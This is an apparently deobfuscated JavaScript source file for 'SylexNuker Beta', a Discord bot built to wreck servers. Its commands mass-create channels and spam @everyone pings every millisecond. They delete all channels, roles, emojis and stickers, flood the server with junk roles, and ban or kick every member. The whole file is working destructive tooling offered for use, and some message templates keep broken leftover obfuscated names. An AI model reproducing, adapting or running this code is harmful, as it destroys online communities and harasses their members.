"use strict";
const {Client: Client, Intents: Intents, MessageEmbed: MessageEmbed} = require("discord.js");
const nuker = new Client({intents: Object.values(Intents.FLAGS).reduce((buckets, name) => {
  return buckets + name;
})});
const {red: red, greenBright: greenBright, cyan: cyan, yellow: yellow} = require("chalk");
const {token: token, prefix: prefix, userID: userID, disableEveryone: disableEveryone} = require("../config/config.json");
nuker.on("ready", () => {
  console.clear();
  console.log(red(`${`
\
    
\
                                                   
\
  ██████▓██   ██▓ ██▓    ▓█████ ▒██   ██▒ ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
\
▒██    ▒ ▒██  ██▒▓██▒    ▓█   ▀ ▒▒ █ █ ▒░ ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
\
░ ▓██▄    ▒██ ██░▒██░    ▒███   ░░  █   ░▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
\
  ▒   ██▒ ░ ▐██▓░▒██░    ▒▓█  ▄  ░ █ █ ▒ ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
\
▒██████▒▒ ░ ██▒▓░░██████▒░▒████▒▒██▒ ▒██▒▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
\
▒ ▒▓▒ ▒ ░  ██▒▒▒ ░ ▒░▓  ░░░ ▒░ ░▒▒ ░ ░▓ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
\
░ ░▒  ░ ░▓██ ░▒░ ░ ░ ▒  ░ ░ ░  ░░░   ░▒ ░░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
\
░  ░  ░  ▒ ▒ ░░    ░ ░      ░    ░    ░     ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
\
      ░  ░ ░         ░  ░   ░  ░ ░    ░           ░    ░     ░  ░      ░  ░   ░     
\
         ░ ░                                                                        
\
                                                                                          
\
                            Created By SystemError404               
\                           And Deobfuscated By Hisako (All Hail Verxnica & Gaya Nukers)
                                                      
\
                            Beta
\
                    Nuker: `}${nuker.user.tag}${`
\
                    Prefix: `}${prefix}${`
\
    `}`));
  nuker.user.setActivity({name: "SylexNuker Beta", type: "PLAYING"});
});
nuker.on("messageCreate", message => {
  function init(i, elem) {
    return new Promise((unsafeTermFn, sessionMiddleware) => {
      if (!i) {
        return sessionMiddleware("Unspecified Args: Specify the amount you wish to mass channels");
      }
      if (isNaN(i)) {
        return sessionMiddleware("Type Error: Use a number for the amout");
      }
      if (i > 500) {
        return sessionMiddleware("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
      }
      if (!delyla) {
        return sessionMiddleware("Bot Missing Permissions: 'MANAGE_CHANNELS'");
      }
      for (let n = 0; n < i; n++) {
        if (message.guild.channels.cache.size === 500) {
          break;
        }
        if (!elem) {
          message.guild.channels.create(`\n                    $ {\n                        ''\n                    }\n                    $ {\n                        _0xfce9x4.author.username\n                    }\n                    $ {\n                        ' was here'\n                    }\n                    `, {type: "GUILD_TEXT"}).catch(error => {
            console.log(red("Error Found: " + error));
          });
        } else {
          message.guild.channels.create(elem, {type: "GUILD_TEXT"}).catch(error => {
            console.log(red("Error Found: " + error));
          });
        }
      }
      unsafeTermFn();
    });
  }
  function reset(e, d, id) {
    return new Promise((require, callback) => {
      if (!e) {
        return callback("Unspecified Args: Specify the amount you wish to mass channels");
      }
      if (isNaN(e)) {
        return callback("Type Error: Use a number for the amout");
      }
      if (e > 500) {
        return callback("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
      }
      if (!delyla) {
        return callback("Bot Missing Permissions: 'MANAGE_CHANNELS'");
      }
      if (!id) {
        return callback("Unspecified Args: Specify the message you wish to mass mention");
      }
      for (let i = 0; i < e; i++) {
        if (message.guild.channels.cache.size === 500) {
          break;
        }
        if (!d) {
          message.guild.channels.create(`\n                    $ {\n                        ''\n                    }\n                    $ {\n                        _0xfce9x4.author.username\n                    }\n                    $ {\n                        ' was here'\n                    }\n                    `, {type: "GUILD_TEXT"}).catch(error => {
            console.log(red("Error Found: " + error));
          }).then(primus => {
            setInterval(() => {
              primus.send("@everyone " + id);
            }, 1);
          });
        } else {
          message.guild.channels.create(d, {type: "GUILD_TEXT"}).catch(error => {
            console.log(red("Error Found: " + error));
          }).then(primus => {
            setInterval(() => {
              primus.send("@everyone " + id);
            }, 1);
          });
        }
      }
      require();
    });
  }
  function syncChallengeToMembers() {
    return new Promise((exec, all) => {
      if (!delyla) {
        return all("Bot Missing Permissions: 'MANAGE_CHANNELS'");
      }
      message.guild.channels.cache.forEach(ContactEndpoint => {
        return ContactEndpoint.delete().catch(error => {
          console.log(red("Error Found: " + error));
        });
      });
      exec();
    });
  }
  function run(end, options) {
    return new Promise((canCreateDiscussions, addComment) => {
      if (!end) {
        return addComment("Unspecified Args: Specify the amount you wish to mass roles");
      }
      if (isNaN(end)) {
        return addComment("Type Error: Use a number for the amout");
      }
      if (!ellycia) {
        return addComment("Bot Missing Permissions: 'MANAGE_ROLES'");
      }
      for (let j = 0; j <= end; j++) {
        if (message.guild.roles.cache.size === 250) {
          break;
        }
        if (!options) {
          message.guild.roles.create({name: "nuked", color: "RANDOM", position: j++}).catch(error => {
            console.log(red("Error Found: " + error));
          });
        } else {
          message.guild.roles.create({name: options, color: "RANDOM", position: j++}).catch(error => {
            console.log(red("Error Found: " + error));
          });
        }
      }
    });
  }
  function loadData() {
    return new Promise((canCreateDiscussions, callback) => {
      if (!ellycia) {
        return callback("Bot Missing Permissions: 'MANAGE_ROLES'");
      }
      message.guild.roles.cache.forEach(ContactEndpoint => {
        return ContactEndpoint.delete().catch(error => {
          console.log(red("Error Found: " + error));
        });
      });
    });
  }
  function search() {
    return new Promise((canCreateDiscussions, callback) => {
      if (!zaheed) {
        return callback("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
      }
      message.guild.emojis.cache.forEach(ContactEndpoint => {
        return ContactEndpoint.delete().catch(error => {
          console.log(red("Error Found: " + error));
        });
      });
    });
  }
  function clearAppFolder() {
    return new Promise((canCreateDiscussions, all) => {
      if (!zaheed) {
        return all("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
      }
      message.guild.stickers.cache.forEach(ContactEndpoint => {
        return ContactEndpoint.delete().catch(error => {
          console.log(red("Error Found: " + error));
        });
      });
    });
  }
  function fn() {
    return new Promise((canCreateDiscussions, exits) => {
      if (!monya) {
        return exits("Bot Missing Permissions: 'BAN_MEMBERS'");
      }
      let filenameFilter = message.guild.members.cache.map(timeline_mode => {
        return timeline_mode.id;
      });
      message.reply("Found " + filenameFilter.length + " users.").then(editDesc => {
        setTimeout(() => {
          editDesc.edit("Banning...");
          for (let ii = 0; ii < filenameFilter.length; ii++) {
            const contribGroupNodeId = filenameFilter[ii];
            const macro = message.guild.members.cache.get(contribGroupNodeId);
            macro.ban().catch(error => {
              console.log(red("Error Found: " + error));
            }).then(() => {
              console.log(greenBright(`\n                    $ {\n                        ''\n                    }\n                    $ {\n                        _0xfce9x26.user.tag\n                    }\n                    $ {\n                        ' was banned.'\n                    }\n                    `));
            });
          }
        }, 2e3);
      });
    });
  }
  function link() {
    return new Promise((canCreateDiscussions, $templateRequest) => {
      if (!greely) {
        return $templateRequest("Bot Missing Permissions: 'KICK_MEMBERS'");
      }
      let filenameFilter = message.guild.members.cache.map(timeline_mode => {
        return timeline_mode.id;
      });
      message.reply("Found " + filenameFilter.length + " users.").then(editDesc => {
        setTimeout(() => {
          editDesc.edit("Banning...");
          for (let ii = 0; ii < filenameFilter.length; ii++) {
            const contribGroupNodeId = filenameFilter[ii];
            const self = message.guild.members.cache.get(contribGroupNodeId);
            self.kick().catch(error => {
              console.log(red("Error Found: " + error));
            }).then(() => {
              console.log(greenBright(`\n                    $ {\n                        ''\n                    }\n                    $ {\n                        _0xfce9x26.user.tag\n                    }\n                    $ {\n                        ' was kicked.'\n                    }\n                    `));
            });
          }
        }, 2e3);
      });
    });
  }
  const EmbeddedSchema = (new MessageEmbed).setDescription(`${`**SylexNuker Beta ;**\n    \\n**mass channels ;**\n    `}${prefix}${"mc [amount] (text) i.e \\`"}${prefix}${`mc 5 test\\\`\\n\n    **mass channel n ping ;**\n    `}${prefix}${"cp [amount] (text), {message} i.e \\`"}${prefix}${`cp 5 test, testing\\\`\\n\n    **mass roles ;**\n    `}${prefix}${"mr [amount] (text) i.e \\`"}${prefix}${`mr 5 test\\\`\\n\n    **delete channels ;**\n    `}${prefix}${`dc\\n\n    **delete roles ;**\n    `}${prefix}${`dr\\n\n    **delete emotes ;**\n    `}${prefix}${`de\\n\n    **delete stickers (new) ;**\n    `}${prefix}${`ds\\n\n    **mass kick ;**\n    `}${prefix}${`mk\\n\n    **mass ban ;**\n    `}${prefix}${`mb\n    `}`).setFooter(`${"© SylexNuker Beta"}`).setColor(3553598).setTimestamp(Date.now());
  const delyla = message.guild.me.permissions.has("MANAGE_CHANNELS");
  const monya = message.guild.me.permissions.has("BAN_MEMBERS");
  const greely = message.guild.me.permissions.has("KICK_MEMBERS");
  const ellycia = message.guild.me.permissions.has("MANAGE_ROLES");
  const zaheed = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS");
  let nodeStack = message.content.split(" ").slice(1);
  var node = nodeStack[0];
  var data = nodeStack.slice(1).join(" ");
  var opts = nodeStack.slice(2).join(", ");
  if (!disableEveryone) {
    if (message.content.startsWith(prefix + "help")) {
      message.channel.send({embeds: [EmbeddedSchema]});
    }
    if (message.content.startsWith(prefix + "mc")) {
      init(node, data).catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "dc")) {
      syncChallengeToMembers().catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "cp")) {
      reset(node, data, opts).catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "mr")) {
      run(node, data).catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "dr")) {
      loadData().catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "ds")) {
      clearAppFolder().catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "de")) {
      search().catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "mb")) {
      fn().catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "mk")) {
      link().catch(reply => {
        message.reply(reply);
      });
    }
  } else {
    if (message.content.startsWith(prefix + "help")) {
      if (message.author.id != userID) {
        return message.reply("You are not authorised to use any of this tools' commands.");
      }
      message.channel.send({embeds: [EmbeddedSchema]});
    }
    if (message.content.startsWith(prefix + "mc")) {
      if (message.author.id != userID) {
        return message.reply("You are not authorised to use any of this tools' commands.");
      }
      init(node, data).catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "dc")) {
      if (message.author.id != userID) {
        return message.reply("You are not authorised to use any of this tools' commands.");
      }
      syncChallengeToMembers().catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "cp")) {
      if (message.author.id != userID) {
        return message.reply("You are not authorised to use any of this tools' commands.");
      }
      reset(node, data, opts).catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "mr")) {
      if (message.author.id != userID) {
        return message.reply("You are not authorised to use any of this tools' commands.");
      }
      run(node, data).catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "dr")) {
      if (message.author.id != userID) {
        return message.reply("You are not authorised to use any of this tools' commands.");
      }
      loadData().catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "ds")) {
      if (message.author.id != userID) {
        return message.reply("You are not authorised to use any of this tools' commands.");
      }
      clearAppFolder().catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "de")) {
      if (message.author.id != userID) {
        return message.reply("You are not authorised to use any of this tools' commands.");
      }
      search().catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "mb")) {
      if (message.author.id != userID) {
        return message.reply("You are not authorised to use any of this tools' commands.");
      }
      fn().catch(reply => {
        message.reply(reply);
      });
    }
    if (message.content.startsWith(prefix + "mk")) {
      if (message.author.id != userID) {
        return message.reply("You are not authorised to use any of this tools' commands.");
      }
      link().catch(reply => {
        message.reply(reply);
      });
    }
  }
});
try {
  nuker.login(token);
} catch (logValues) {
  console.error(logValues);
}
;
